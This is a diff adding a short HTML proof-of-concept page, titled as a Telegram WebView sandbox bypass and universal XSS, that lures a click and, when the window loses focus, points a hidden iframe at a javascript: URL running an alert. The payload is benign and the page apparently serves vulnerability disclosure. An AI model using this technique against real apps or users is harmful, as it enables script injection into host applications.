@@ -1,0 +1,28 @@
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+   
+	<script>
+		window.onblur = function() {
+			document.getElementById("iframe").src = "javascript:alert:(1)";
+		}
+	</script>
+</head>
+
+<body>
+   <center>
+		<br>
+		<h1>Click Here</h1>
+	</center>
+   <iframe id="iframe"></iframe>
+</body>
+
+</html>
